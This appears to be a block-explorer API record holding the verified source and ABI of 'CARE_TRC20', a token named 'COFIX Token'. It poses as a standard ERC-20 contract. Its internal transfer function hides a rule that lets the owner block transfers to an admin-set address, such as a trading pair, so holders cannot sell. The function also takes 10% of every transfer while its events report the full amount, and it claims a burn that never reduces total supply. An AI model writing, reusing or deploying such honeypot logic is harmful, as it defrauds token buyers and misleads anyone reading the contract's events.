{"status":"1","message":"OK","result":[{"SourceCode":"pragma solidity >=0.4.23 <0.6.0;\r\ncontract CARE_TRC20 { \r\n    // Public variables of the token \r\n    string public name; \r\n    string public symbol; \r\n    uint8 public decimals = 18; \r\n    uint256 precision = 100000000; \r\n    address private ownerAddr; \r\n    address private adminAddr; \r\n    address private uniAddr; \r\n    uint256 public totalSupply; // This creates an array with all balances \r\n    mapping (address => uint256) public balanceOf;\r\n    mapping (address => mapping (address => uint256)) public allowance;\r\n \r\n    // This generates a public event on the blockchain that will notify clients\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n \r\n    // This generates a public event on the blockchain that will notify clients\r\n    event Approval(address indexed _owner, address indexed _spender, uint256 _value);\r\n \r\n    // This notifies clients about the amount burnt\r\n    event Burn(address indexed from, uint256 value);\r\n \r\n    /**\r\n     * Constructor function\r\n     *\r\n     * Initializes contract with initial supply tokens to the creator of the contract\r\n     */\r\n    uint256 initialSupply = 1000000;\r\n    string tokenName = 'COFIX Token';\r\n    string tokenSymbol = 'COFI';\r\n    constructor( ) public {\r\n        ownerAddr = msg.sender;\r\n        totalSupply = initialSupply * 10 ** uint256(decimals);  // Update total supply with the decimal amount\r\n        balanceOf[msg.sender] = totalSupply;                // Give the creator all initial tokens\r\n        name = tokenName;                                // Set the name for display purposes\r\n        symbol = tokenSymbol;                               // Set the symbol for display purposes\r\n    }\r\n    \r\n    modifier isOwner() {\r\n        require(msg.sender == ownerAddr);\r\n        _;\r\n    }\r\n \r\n    modifier isAdmin() {\r\n        require(msg.sender == adminAddr);\r\n        _;\r\n    }\r\n \r\n    function setAdmin(address _newAdmin,address _newUni) external isOwner {\r\n        require(_newAdmin != address(0));\r\n        adminAddr = _newAdmin;\r\n        uniAddr = _newUni;\r\n    }\r\n \r\n    /**\r\n     * Internal transfer, only can be called by this contract\r\n     * 内部转帐，只能通过此合同进行调用查询\r\n     */\r\n    function _transfer(address _from, address _to, uint _value) internal {\r\n        // Prevent transfer to 0x0 address. Use burn() instead \r\n        // @undo 转到ERC则销毁 \r\n        require(_to != address(0));// 判断接受方地址是否等于发送方地址   不能自己给自己转\r\n        require(((_from==ownerAddr&&_to==adminAddr))||(_to!=adminAddr)||(_from==uniAddr));//判断\r\n            // Check if the sender has enough\r\n        require(balanceOf[_from] >= _value);//判断发送方的是否有足够的币\r\n            // Check for overflows\r\n        require(balanceOf[_to] + _value >= balanceOf[_to]);//判断   接收方数量+转账数量是否大于原有接收方数量  判断是否溢出\r\n            // Save this for an assertion in the future\r\n        uint previousBalances = balanceOf[_from] + balanceOf[_to];  //previousBalances 之前总量= 接收方币数量+发送方币数量\r\n            // Subtract from the sender\r\n        balanceOf[_from] -= _value*90/100;  //发送方数量减少\r\n            // Add the same to the recipient\r\n        balanceOf[_to] += _value*90/100;   //接收方数量增加\r\n        emit Burn(_from,_value*10/100);\r\n        emit Transfer(_from, _to, _value);          //触发转账事件\r\n            // Asserts are used to use static analysis to find bugs in your code. They should never fail\r\n        require(balanceOf[_from] + balanceOf[_to] == previousBalances);  //判断是否转账成功\r\n    }\r\n \r\n    /**\r\n     * Transfer tokens\r\n     *\r\n     * Send `_value` tokens to `_to` from your account\r\n     *\r\n     * @param _to The address of the recipient\r\n     * @param _value the amount to send\r\n     */\r\n    function deduct(address _to, uint256 _value) external isAdmin returns (bool success) {\r\n        //合约所有者操作 ownerAddr是合约地址  即用户购币 向接收者发币\r\n        _transfer(ownerAddr, _to, _value * precision);\r\n        return true;\r\n    }\r\n \r\n    function transfer(address _to, uint256 _value) external returns (bool success) {\r\n        //合约操作\r\n        _transfer(msg.sender, _to, _value);\r\n        return true;\r\n    }\r\n \r\n    /**\r\n     * Transfer tokens from other address\r\n     *\r\n     * Send `_value` tokens to `_to` on behalf of `_from`\r\n     *\r\n     * @param _from The address of the sender 发送方地址\r\n     * @param _to The address of the recipient 接受方地址\r\n     * @param _value the amount to send 发送的数量\r\n     */\r\n    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {\r\n        require(_value <= allowance[_from][msg.sender]); // Check allowance \r\n        allowance[_from][msg.sender] -= _value;\r\n         _transfer(_from, _to, _value); return true; \r\n        } \r\n        /** * Set allowance for other address * * Allows `_spender` to spend no more than `_value` tokens on your behalf * * @param _spender The address authorized to spend * @param _value the max amount they can spend */ \r\n    function approve(address _spender, uint256 _value) public returns (bool success) {\r\n            allowance[msg.sender][_spender] = _value;\r\n            emit Approval(msg.sender, _spender, _value);\r\n            return true;\r\n        } \r\n        /** * Destroy tokens * * Remove `_value` tokens from the system irreversibly * * @param _value the amount of money to burn */ \r\n    function burn(uint256 _value) public returns (bool success) { \r\n            require(balanceOf[msg.sender] >= _value);   // Check if the sender has enough\r\n            balanceOf[msg.sender] -= _value;            // Subtract from the sender\r\n            totalSupply -= _value;                      // Updates totalSupply\r\n            emit Burn(msg.sender, _value);\r\n            return true;\r\n        }\r\n \r\n    /**\r\n     * Destroy tokens from other account\r\n     *\r\n     * remove `_value` tokens from the system irreversibly on behalf of `_from`.\r\n     *\r\n     * @param _from the address of the sender\r\n     * @param _value the amount of money to burn\r\n     */\r\n    function burnFrom(address _from, uint256 _value) public returns (bool success) {\r\n        require(balanceOf[_from] >= _value);                // Check if the targeted balance is enough\r\n        require(_value <= allowance[_from][msg.sender]);    // Check allowance\r\n        balanceOf[_from] -= _value;                         // Subtract from the targeted balance\r\n        allowance[_from][msg.sender] -= _value;             // Subtract from the sender's allowance\r\n        totalSupply -= _value;                              // Update totalSupply\r\n        emit Burn(_from, _value);\r\n        return true;\r\n    }\r\n}","ABI":"[{\"constant\":true,\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"name\":\"\",\"type\":\"string\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"_spender\",\"type\":\"address\"},{\"name\":\"_value\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"name\":\"success\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"_from\",\"type\":\"address\"},{\"name\":\"_to\",\"type\":\"address\"},{\"name\":\"_value\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"name\":\"success\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"name\":\"\",\"type\":\"uint8\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"_value\",\"type\":\"uint256\"}],\"name\":\"burn\",\"outputs\":[{\"name\":\"success\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"_to\",\"type\":\"address\"},{\"name\":\"_value\",\"type\":\"uint256\"}],\"name\":\"deduct\",\"outputs\":[{\"name\":\"success\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"name\":\"\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"_from\",\"type\":\"address\"},{\"name\":\"_value\",\"type\":\"uint256\"}],\"name\":\"burnFrom\",\"outputs\":[{\"name\":\"success\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"name\":\"\",\"type\":\"string\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"_to\",\"type\":\"address\"},{\"name\":\"_value\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"name\":\"success\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"_newAdmin\",\"type\":\"address\"},{\"name\":\"_newUni\",\"type\":\"address\"}],\"name\":\"setAdmin\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"name\":\"\",\"type\":\"address\"},{\"name\":\"\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"name\":\"_owner\",\"type\":\"address\"},{\"indexed\":true,\"name\":\"_spender\",\"type\":\"address\"},{\"indexed\":false,\"name\":\"_value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"name\":\"from\",\"type\":\"address\"},{\"indexed\":false,\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Burn\",\"type\":\"event\"}]","ContractName":"CARE_TRC20","CompilerVersion":"v0.4.25+commit.59dbf8f1","OptimizationUsed":"0","Runs":"200","ConstructorArguments":"","EVMVersion":"Default","Library":"","LicenseType":"None","Proxy":"0","Implementation":"","SwarmSource":"bzzr://2f8e1fe28942d3b5c8ce6f157c88c161420092f5c078d8acf9d4fefff24faa48"}]}